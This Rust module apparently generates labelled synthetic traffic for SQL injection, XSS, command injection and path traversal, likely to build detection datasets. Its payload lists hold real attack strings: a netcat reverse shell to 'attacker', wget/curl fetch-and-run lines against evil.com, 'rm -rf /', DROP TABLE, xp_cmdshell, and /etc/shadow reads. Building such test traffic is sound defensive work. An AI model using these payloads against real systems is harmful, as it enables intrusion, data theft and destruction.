//! Web application attacks
//!
//! SQL injection, XSS, command injection, path traversal.

use std::net::{IpAddr, SocketAddr};
use rand::Rng;

use crate::attacks::{AttackGenerator, AttackType};
use crate::generator::PacketRecord;
use crate::state_machine::{TcpFlags, TcpStateMachine};

/// SQL Injection generator
pub struct SqlInjectionGenerator {
    state_machine: TcpStateMachine,
    target_port: u16,
}

impl SqlInjectionGenerator {
    pub fn new(target_port: u16) -> Self {
        Self {
            state_machine: TcpStateMachine::new(),
            target_port,
        }
    }

    fn payloads() -> Vec<&'static str> {
        vec![
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "' UNION SELECT username,password FROM users--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND SLEEP(5)--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' OR EXISTS(SELECT * FROM users)--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1 UNION SELECT 1,2,3--",
            "' HAVING 1=1--",
            "' GROUP BY columnname HAVING 1=1--",
            "admin' AND '1'='1",
            "' OR 'x'='x",
        ]
    }
}

impl AttackGenerator for SqlInjectionGenerator {
    fn generate(&mut self, count: usize, target: IpAddr, src_ip: IpAddr) -> Vec<PacketRecord> {
        let mut records = Vec::with_capacity(count);
        let mut rng = rand::thread_rng();
        let payloads = Self::payloads();

        let attempts = count / 4;
        let mut packet_id = 0u64;

        for _ in 0..attempts {
            let src_port: u16 = rng.gen_range(1024..65535);
            let src = SocketAddr::new(src_ip, src_port);
            let dst = SocketAddr::new(target, self.target_port);

            // TCP handshake
            let (seq, ack, flags) = self.state_machine.start_handshake(src, dst);
            records.push(PacketRecord::new(packet_id, AttackType::SqlInjection)
                .with_tcp(src, dst, flags, seq, ack, &[]));
            packet_id += 1;

            let server_seq: u32 = rng.gen();
            let (seq2, ack2, flags2) = self.state_machine.complete_handshake(src, dst, server_seq);
            records.push(PacketRecord::new(packet_id, AttackType::SqlInjection)
                .with_tcp(src, dst, flags2, seq2, ack2, &[]));
            packet_id += 1;

            // HTTP request with SQLi payload
            let payload = payloads[rng.gen_range(0..payloads.len())];
            let encoded = url_encode(payload);
            let paths = ["/login", "/search", "/user", "/product", "/api/query"];
            let path = paths[rng.gen_range(0..paths.len())];

            let request = format!(
                "GET {}?id={}&name={} HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                path, encoded, encoded
            );
            records.push(PacketRecord::new(packet_id, AttackType::SqlInjection)
                .with_tcp(src, dst, TcpFlags::psh_ack(), seq2, ack2, request.as_bytes()));
            packet_id += 1;

            // FIN
            records.push(PacketRecord::new(packet_id, AttackType::SqlInjection)
                .with_tcp(src, dst, TcpFlags::fin_ack(), seq2 + request.len() as u32, ack2, &[]));
            packet_id += 1;

            if packet_id as usize >= count {
                break;
            }
        }

        records
    }

    fn attack_type(&self) -> AttackType {
        AttackType::SqlInjection
    }

    fn description(&self) -> &'static str {
        "SQL injection - various SQLi payloads in HTTP requests"
    }
}

/// XSS generator
pub struct XssGenerator {
    state_machine: TcpStateMachine,
    target_port: u16,
}

impl XssGenerator {
    pub fn new(target_port: u16) -> Self {
        Self {
            state_machine: TcpStateMachine::new(),
            target_port,
        }
    }

    fn payloads() -> Vec<&'static str> {
        vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>script>alert('XSS')<</script>/script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "<form action=\"javascript:alert('XSS')\">",
        ]
    }
}

impl AttackGenerator for XssGenerator {
    fn generate(&mut self, count: usize, target: IpAddr, src_ip: IpAddr) -> Vec<PacketRecord> {
        let mut records = Vec::with_capacity(count);
        let mut rng = rand::thread_rng();
        let payloads = Self::payloads();

        let attempts = count / 4;
        let mut packet_id = 0u64;

        for _ in 0..attempts {
            let src_port: u16 = rng.gen_range(1024..65535);
            let src = SocketAddr::new(src_ip, src_port);
            let dst = SocketAddr::new(target, self.target_port);

            // TCP handshake
            let (seq, ack, flags) = self.state_machine.start_handshake(src, dst);
            records.push(PacketRecord::new(packet_id, AttackType::Xss)
                .with_tcp(src, dst, flags, seq, ack, &[]));
            packet_id += 1;

            let server_seq: u32 = rng.gen();
            let (seq2, ack2, flags2) = self.state_machine.complete_handshake(src, dst, server_seq);
            records.push(PacketRecord::new(packet_id, AttackType::Xss)
                .with_tcp(src, dst, flags2, seq2, ack2, &[]));
            packet_id += 1;

            // HTTP request with XSS payload
            let payload = payloads[rng.gen_range(0..payloads.len())];
            let encoded = url_encode(payload);
            let paths = ["/search", "/comment", "/profile", "/message", "/post"];
            let path = paths[rng.gen_range(0..paths.len())];

            let request = format!(
                "GET {}?q={}&input={} HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                path, encoded, encoded
            );
            records.push(PacketRecord::new(packet_id, AttackType::Xss)
                .with_tcp(src, dst, TcpFlags::psh_ack(), seq2, ack2, request.as_bytes()));
            packet_id += 1;

            // FIN
            records.push(PacketRecord::new(packet_id, AttackType::Xss)
                .with_tcp(src, dst, TcpFlags::fin_ack(), seq2 + request.len() as u32, ack2, &[]));
            packet_id += 1;

            if packet_id as usize >= count {
                break;
            }
        }

        records
    }

    fn attack_type(&self) -> AttackType {
        AttackType::Xss
    }

    fn description(&self) -> &'static str {
        "XSS - cross-site scripting payloads in HTTP requests"
    }
}

/// Command injection generator
pub struct CommandInjectionGenerator {
    state_machine: TcpStateMachine,
    target_port: u16,
}

impl CommandInjectionGenerator {
    pub fn new(target_port: u16) -> Self {
        Self {
            state_machine: TcpStateMachine::new(),
            target_port,
        }
    }

    fn payloads() -> Vec<&'static str> {
        vec![
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(whoami)",
            "; cat /etc/shadow",
            "| nc attacker 4444 -e /bin/sh",
            "; wget http://evil.com/shell.sh",
            "& curl http://evil.com/payload | sh",
            "; rm -rf /",
            "|| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; echo vulnerable",
            "| id",
            "; uname -a",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "%0aid",
            "%0a/bin/cat%20/etc/passwd",
            ";${IFS}cat${IFS}/etc/passwd",
        ]
    }
}

impl AttackGenerator for CommandInjectionGenerator {
    fn generate(&mut self, count: usize, target: IpAddr, src_ip: IpAddr) -> Vec<PacketRecord> {
        let mut records = Vec::with_capacity(count);
        let mut rng = rand::thread_rng();
        let payloads = Self::payloads();

        let attempts = count / 4;
        let mut packet_id = 0u64;

        for _ in 0..attempts {
            let src_port: u16 = rng.gen_range(1024..65535);
            let src = SocketAddr::new(src_ip, src_port);
            let dst = SocketAddr::new(target, self.target_port);

            // TCP handshake
            let (seq, ack, flags) = self.state_machine.start_handshake(src, dst);
            records.push(PacketRecord::new(packet_id, AttackType::CommandInjection)
                .with_tcp(src, dst, flags, seq, ack, &[]));
            packet_id += 1;

            let server_seq: u32 = rng.gen();
            let (seq2, ack2, flags2) = self.state_machine.complete_handshake(src, dst, server_seq);
            records.push(PacketRecord::new(packet_id, AttackType::CommandInjection)
                .with_tcp(src, dst, flags2, seq2, ack2, &[]));
            packet_id += 1;

            // HTTP request with command injection
            let payload = payloads[rng.gen_range(0..payloads.len())];
            let encoded = url_encode(payload);
            let paths = ["/ping", "/exec", "/run", "/shell", "/cmd"];
            let path = paths[rng.gen_range(0..paths.len())];

            let request = format!(
                "GET {}?host={}&cmd={} HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                path, encoded, encoded
            );
            records.push(PacketRecord::new(packet_id, AttackType::CommandInjection)
                .with_tcp(src, dst, TcpFlags::psh_ack(), seq2, ack2, request.as_bytes()));
            packet_id += 1;

            // FIN
            records.push(PacketRecord::new(packet_id, AttackType::CommandInjection)
                .with_tcp(src, dst, TcpFlags::fin_ack(), seq2 + request.len() as u32, ack2, &[]));
            packet_id += 1;

            if packet_id as usize >= count {
                break;
            }
        }

        records
    }

    fn attack_type(&self) -> AttackType {
        AttackType::CommandInjection
    }

    fn description(&self) -> &'static str {
        "Command injection - OS command injection payloads"
    }
}

/// Path traversal generator
pub struct PathTraversalGenerator {
    state_machine: TcpStateMachine,
    target_port: u16,
}

impl PathTraversalGenerator {
    pub fn new(target_port: u16) -> Self {
        Self {
            state_machine: TcpStateMachine::new(),
            target_port,
        }
    }

    fn payloads() -> Vec<&'static str> {
        vec![
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
            "....\\....\\....\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/etc/shadow",
            "....//....//....//etc/shadow",
        ]
    }
}

impl AttackGenerator for PathTraversalGenerator {
    fn generate(&mut self, count: usize, target: IpAddr, src_ip: IpAddr) -> Vec<PacketRecord> {
        let mut records = Vec::with_capacity(count);
        let mut rng = rand::thread_rng();
        let payloads = Self::payloads();

        let attempts = count / 4;
        let mut packet_id = 0u64;

        for _ in 0..attempts {
            let src_port: u16 = rng.gen_range(1024..65535);
            let src = SocketAddr::new(src_ip, src_port);
            let dst = SocketAddr::new(target, self.target_port);

            // TCP handshake
            let (seq, ack, flags) = self.state_machine.start_handshake(src, dst);
            records.push(PacketRecord::new(packet_id, AttackType::PathTraversal)
                .with_tcp(src, dst, flags, seq, ack, &[]));
            packet_id += 1;

            let server_seq: u32 = rng.gen();
            let (seq2, ack2, flags2) = self.state_machine.complete_handshake(src, dst, server_seq);
            records.push(PacketRecord::new(packet_id, AttackType::PathTraversal)
                .with_tcp(src, dst, flags2, seq2, ack2, &[]));
            packet_id += 1;

            // HTTP request with path traversal
            let payload = payloads[rng.gen_range(0..payloads.len())];
            let paths = ["/download", "/file", "/read", "/view", "/include"];
            let path = paths[rng.gen_range(0..paths.len())];

            let request = format!(
                "GET {}?file={}&path={} HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                path, payload, payload
            );
            records.push(PacketRecord::new(packet_id, AttackType::PathTraversal)
                .with_tcp(src, dst, TcpFlags::psh_ack(), seq2, ack2, request.as_bytes()));
            packet_id += 1;

            // FIN
            records.push(PacketRecord::new(packet_id, AttackType::PathTraversal)
                .with_tcp(src, dst, TcpFlags::fin_ack(), seq2 + request.len() as u32, ack2, &[]));
            packet_id += 1;

            if packet_id as usize >= count {
                break;
            }
        }

        records
    }

    fn attack_type(&self) -> AttackType {
        AttackType::PathTraversal
    }

    fn description(&self) -> &'static str {
        "Path traversal - directory traversal and LFI payloads"
    }
}

/// Simple URL encoding
fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        match c {
            'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => {
                result.push(c);
            }
            ' ' => result.push_str("%20"),
            _ => {
                for b in c.to_string().as_bytes() {
                    result.push_str(&format!("%{:02X}", b));
                }
            }
        }
    }
    result
}
